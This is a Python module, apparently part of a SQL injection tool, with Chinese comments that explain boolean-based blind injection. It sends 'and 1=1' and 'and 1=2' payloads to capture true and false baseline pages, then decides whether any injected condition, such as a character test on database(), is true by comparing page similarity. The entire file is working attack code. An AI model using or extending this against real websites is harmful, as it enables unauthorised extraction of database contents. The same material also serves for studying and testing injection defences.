"""布尔条件判断：盲注的核心。

原理：
    and 1=1  → 条件为真 → 页面正常显示数据（基准“真页面”）
    and 1=2  → 条件为假 → 页面少了一块数据（基准“假页面”）

之后任何条件语句（如 and ascii(substr(database(),1,1))>100），
看返回的页面更像“真页面”还是“假页面”，就知道条件的真假——这就是布尔盲注。
"""
from response import analyzer


class TruthDetector:
    """先采集真/假两个基准页面，再用相似度判断任意条件的真假。"""

    def __init__(self, injector):
        self.injector = injector
        self.page_true = injector.inject("and 1=1", stage="bool_true_baseline").text
        self.page_false = injector.inject("and 1=2", stage="bool_false_baseline").text
        # 两个基准页面必须有明显差异，否则布尔判断不可靠
        self.reliable = not analyzer.pages_same(self.page_true, self.page_false)

    def check(self, statement: str, stage: str = "bool_check") -> bool:
        """执行一个 and (条件) 语句，返回条件的真假。"""
        page = self.injector.inject(statement, stage=stage).text
        return analyzer.ratio(page, self.page_true) >= analyzer.ratio(page, self.page_false)
